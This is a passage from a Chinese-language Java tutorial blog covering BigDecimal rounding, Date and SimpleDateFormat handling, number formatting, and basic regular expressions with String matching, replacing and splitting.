RoundingMode.HALF_UP).doubleValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    我们分析一下核心语句：</p><p>​    首先将double型的num封装在BigDecimal里，因为BigDecimal有一个divide方法，那么任何数字除以1.0的时候都是它本身，所以在方法里封装一个BigDecimal(1.0)。RoundingMode.HALF_UP是向上进位。而这一个整体的返回值是BigDecimal，BigDecimal是Number的子类，所以可以使用doubleValue()处理。</p><p>范例：使用 BigDecimal 实现四舍五入处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//大数据计算</span></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"><span class="keyword">import</span> java.math.RoundingMode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MathUtil1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">MathUtil1</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 实现四舍五入操作</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num   要进行四舍五入操作的数字</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> scale 四舍五入保留的小数位数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 四舍五入处理后的结果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">round</span><span class="params">(<span class="type">double</span> num, <span class="type">int</span> scale)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(num).divide(<span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1.0&quot;</span>), scale, RoundingMode.HALF_UP).doubleValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test30</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(MathUtil1.round(<span class="number">19.6352</span>, <span class="number">2</span>)); <span class="comment">//19.64</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    BigDecimal 与 Math 相比，Math 的处理由于使用的都是基本数据类型，所以性能高于大数字处理类 BigDecimal。</p><hr><h3 id="日期操作类"><a href="#日期操作类" class="headerlink" title="日期操作类"></a>日期操作类</h3><h4 id="Date日期处理类"><a href="#Date日期处理类" class="headerlink" title="Date日期处理类"></a>Date日期处理类</h4><p>​    从整体的 java 来讲一直在强调简单 java 类的主要设计来自于数据表的结构，那么在数剧表的结果里面常用的类型:字符串、日期，所以现在的程序之中只差日期了。</p><pre><code> 在 Java 里面提供有一个 java.util.Date 的类，这个类如果直接实例化就可以获取当前的日期时间。</code></pre><p>范例:观察 Java.util.Date 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Data类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test31</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        System.out.println(date); <span class="comment">//Wed Sep 21 11:33:17 CST 2022</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    不适合阅读，这个时候需要进一步去观察 Date 类中的构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Date</span><span class="params">()</span> &#123; <span class="built_in">this</span>(System.currentTimeMillis()); &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Date</span><span class="params">(<span class="type">long</span> date)</span> &#123; fastTime = date; &#125;</span><br></pre></td></tr></table></figure><p>​    通过以上的源代码分析可以得出一个结论: Date 类中只是对 long 数据的一种包装。所以 date 类中一定提供所谓的日期与 long 数据类型之间转换的方法，这两个方法非常重要:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将 <span class="type">long</span> 转为日期: <span class="keyword">public</span> date（<span class="type">long</span> date）；</span><br><span class="line">将 Date 转为<span class="type">long</span>: <span class="keyword">public</span> <span class="type">long</span> getTime（）；</span><br></pre></td></tr></table></figure><p>范例:观察 Date 与 long 的转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Data类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test31</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Date</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">long</span> <span class="variable">current</span> <span class="operator">=</span> data.getTime();</span><br><span class="line">        current += <span class="number">864000</span> * <span class="number">1000</span>;<span class="comment">//10天</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">Date</span>(current));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73933.jpg"                      alt="image-20220921133116673"                ></p><p>​    long 之中可以保存毫秒的数据级，这样方便程序处理。</p><h4 id="日期格式化"><a href="#日期格式化" class="headerlink" title="日期格式化"></a>日期格式化</h4><p>​    虽然 date 可以获取当前的日期时间，但是默认情况下 Date 类输出的日期结构并不能够被国人所习惯，那么现在就需要对显示的格式进行格式化处理，为了可以格式化日期，在 java.text 包中提供有 SimpleDateFormat 程序类。</p><p>​    该类是 DateFormat 的子类，在该类中提供有如下的方法:</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073934.jpg"                      alt="image-20220921134505497"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073935.jpg"                      alt="image-20220921134659863"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">【DateFormat】将日期格式化: <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">format</span><span class="params">(Date date)</span>;</span><br><span class="line"></span><br><span class="line">【DateFormat继承】将字符串转为日期: <span class="keyword">public</span> Date <span class="title function_">Parse</span><span class="params">(String source)</span> <span class="keyword">throws</span> ParseException;</span><br><span class="line"></span><br><span class="line">构造方法:<span class="keyword">public</span> SimpleDateFormat（String pattern）</span><br><span class="line">  - 日期格式：年（yyyy）、月（MM）、日（dd）、时（HH）、分（mm）、秒（ss）、毫秒（SSS）</span><br></pre></td></tr></table></figure><p>范例:格式化日期显示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Data类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test31</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Date</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss.SSS&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sdf.format(data);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    除了可以将日期格式化为字符串之后，也可以实现字符串与日期之间的转换处理</p><p>范例：将日期转为Date</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Data类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test31</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParseException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">birthday</span> <span class="operator">=</span> <span class="string">&quot;1864-11-11 11:11:11.111&quot;</span>;</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss.SSS&quot;</span>);</span><br><span class="line"><span class="comment">//        String str = sdf.format(data);</span></span><br><span class="line"><span class="comment">//        System.out.println(str);</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> sdf.parse(birthday);</span><br><span class="line">        System.out.println(date);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073936.jpg"                      alt="image-20220921135847158"                ></p><p>​    如果在进行字符串定义的时候，所使用的日期时间数字超过了指定的合理范围，则会自动进行进位处理。</p><p>范例：数字格式化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Data类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.NumberFormat;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test31</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParseException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">money</span> <span class="operator">=</span> <span class="number">283782758.23</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> NumberFormat.getInstance().format(money);</span><br><span class="line">        System.out.println(str); <span class="comment">//283,782,758.23</span></span><br><span class="line"><span class="comment">//        String birthday = &quot;1864-11-11 11:11:11.111&quot;;</span></span><br><span class="line"><span class="comment">//        SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss.SSS&quot;);</span></span><br><span class="line"><span class="comment">//        Date date = sdf.parse(birthday);</span></span><br><span class="line"><span class="comment">//        System.out.println(date);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        String str = sdf.format(data);</span></span><br><span class="line"><span class="comment">//        System.out.println(str);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073937.jpg"                      alt="image-20220921140438578"                ></p><p>​    通过到现在的学习发现，String 字符串可以向所有类型转换，基本类型、日期类型。</p><hr><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>​    通过之前的一系列的分析可以发现，String 一个非常万能的类型，因为 String 不仅仅可以支持有各种字符串的处理操作，也支持有向各个数据类型的转换功能，所以在项目的开发之中，只要是用户输入的信息基本上都可以用 String 表示。</p><p>​    于是再向其他类型转换的时候，为了保证转换的正确性，往往需要对其进行一些复杂的验证处理，这种情况下如果只是单纯的依靠 String 类中的方法是非常麻烦的。</p><h4 id="认识正则表达式"><a href="#认识正则表达式" class="headerlink" title="认识正则表达式"></a>认识正则表达式</h4><p>​    现在假设有一个字符串要求你判断字符串是否由数字组成，如果由数字所组成则将变为数字进行乘法计算。</p><p>范例：这是一个基础验证代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test32</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (isNumber(str))&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.parseInt(str);</span><br><span class="line">            System.out.println(num * <span class="number">2</span>); <span class="comment">//246</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isNumber</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">char</span> data[] = str.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; data.length; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[x] &gt; <span class="string">&#x27;9&#x27;</span> || data[x] &lt; <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    实际上这种验证的功能是非常简单的，但是这如此简单的功能却需要开发者编写大量程序逻辑代码那么如果是更加复杂的验证呢？那么在这样的情况下，对于验证来讲最好的做法就是利用正则表达式来完成。</p><p>范例:使用正则表达式实现同样的效果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test32</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (str.matches(<span class="string">&quot;\\d+&quot;</span>))&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.parseInt(str);</span><br><span class="line">            System.out.println(num * <span class="number">2</span>); <span class="comment">//246</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    正则表达式最早是从 Perl 语言里面发展而来的，而后在 JDK1.4 以前如果需要使用到正则表达式的相关定义则需要单独引入其他的*. jar 文件，但是从 JDK1.4 之后，正则已经默认被 JDK 所支持，并且提供有 java.util.regex 开发包，同时针对于 String 类也提出进行了一些修改，使其可以有方法之间支持正则处理。</p><pre><code> 使用正则最大特点在于方便进行验证处理，以及方便进行复杂字符串的修改处理。</code></pre><h4 id="常用正则标记（背）"><a href="#常用正则标记（背）" class="headerlink" title="常用正则标记（背）"></a>常用正则标记（背）</h4><p>​    如果要想进行正则的处理操作，那么就首先需要对常用的正则标记有所掌握，从JDK1.4 开始提供有 java.util.regex 开发包，里边定义这个包里面提供有一-个Pattern 程序类，在这个程序类里面定义有所有支持的正则标记。</p><p>​    <strong>⒈【数量:单个】字符匹配</strong></p><p>​        任意字符：表示由任意字符组成</p><p>​        \\ :匹配”\“</p><p>​        \n :匹配换行</p><p>​        \t :匹配制表符</p><p>​    <strong>⒉【数量:单个】字符集(可以从里面任选一个字符)。</strong></p><p>​        [abc] :表示可能是字母 a、b、c中的任意一个;</p><p>​        [^abc] :表示不是由字母 a、b、C中的任意-一个;</p><p>​        [a-zA-Z] :表示由一个任意字母所组成，不区分大小写;</p><p>​        [0-9] :表示由一位数字所组成;</p><p>​    <strong>3、[数量:单个]简化字符集;</strong></p><p>​        .  :表示任意的一个字符;</p><p>​        \d :等价于“[0-9]”范围;</p><p>​        D :等价于[^0-9]范围;</p><p>​        \s :匹配任意的一位空格，可能是空格、换行、制表符;</p><p>​        \S :匹配任意的非空格、换行、制表符数据;</p><p>​        \w :匹配字母、 数字、下划线， 等价于[a-zA-Z_0-9]</p><p>​        \W :匹配非字母、数字、下划线，等价于[^a-zA-Z_0-9];</p><p>​    <strong>⒋边界匹配:</strong></p><p>​        ^:匹配边界开始;</p><p>​        $:匹配边界结束;</p><p>​    <strong>⒌数量表示，默认情况下只有添加上了数量单位才可以匹配多位字符;</strong></p><p>​        表达式? :该正则可以出现 0 次或 1 次;</p><p>​        表达式* :该正则可以出现 0 次、1 次或多次;</p><p>​        表达式+ :该正则可以出现 1 次或多次;</p><p>​        表达式{n} :表达式的长度正好为 n 次;</p><p>​        表达式{n,} :表达式的长度为 n 次以上</p><p>​        表达式{n,m} :表达式的长度在 n~m 次;</p><p>​    <strong>6.逻辑表达式:可以连接多个正则:</strong> </p><p>​        XY :X 表达式之后紧跟上 Y 表达式;</p><p>​        X｜Y :有一个表达式满足即可;</p><p>​        (X) :为表达式设置一个整体描述， 可以为整体描述设置数量单位。</p><h4 id="String类对正则的支持"><a href="#String类对正则的支持" class="headerlink" title="String类对正则的支持"></a>String类对正则的支持</h4><p>​    在进行正则表达式大部分处理的情况下都会基于 String 类来完成，并且在 String 类里面提供有如下与正则有关的操作方法:</p><table><thead><tr><th>No.</th><th>方法名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>01</td><td><code>public boolean matches(String regex）</code></td><td>普通</td><td>将指定字符串进行正则判断。</td></tr><tr><td>02</td><td><code>public String replaceAll(String regex, String replacement)</code></td><td>普通</td><td>替换全部</td></tr><tr><td>03</td><td><code>public String replaceFirst(String regex, String replacement):</code></td><td>普通</td><td>替换首个</td></tr><tr><td>04</td><td><code>public String[] split(String regex)</code></td><td>普通</td><td>正则拆分</td></tr><tr><td>05</td><td><code>public String[] split(String regex, int limit)</code></td><td>普通</td><td>正则拆分</td></tr></tbody></table><p>​    下面通过一些具体的范例来对正则的使用进行说明。</p><p>范例:实现字符串替换（删除掉非字母与数字）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//String类对正则的支持,字符串替换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test33</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;jfhwifhaifh23i*&amp;(*YJB3iry82*(&amp;*^$^%&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;[^a-zA-Z0-9]&quot;</span>;</span><br><span class="line">        System.out.println(str.replaceAll(regex,<span class="string">&quot;&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073938.jpg"                      alt="image-20220921173154079"                ></p><p>范例：实现字符串的拆分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//String类对正则的支持,字符串替换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test33</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;a1b22c333d4444e55555f666666g&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;\\d+&quot;</span>;</span><br><span class="line">        String[] result = str.split(regex);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; result.length; x++) &#123;</span><br><span class="line">            System.out.print(result[x] + <span class="string">&quot;、&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073939.jpg"                      alt="image-20220921174547237"                ></p><p>​    在正则处理的时候对于拆分与替换的操作相对容易一些， 但是比较麻烦的是数据验证部分。</p><p>范例:判断一个数据是否为小数，如果是小数则将其变为 double 类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//String类对正则的支持,字符串替换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test33</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;100.&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;\\d+(\\.\\d+)?&quot;</span>;</span><br><span class="line">        System.out.println(str.matches(regex)); <span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例:现在判断一个字符串是否由日期所组成，如果是由日期所组成则将其转为 Date 类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//String类对正则的支持,字符串替换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test33</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParseException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;1981-10-15&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (str.matches(regex))&#123;</span><br><span class="line">            System.out.println(<span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd&quot;</span>).parse(str));</span><br><span class="line">        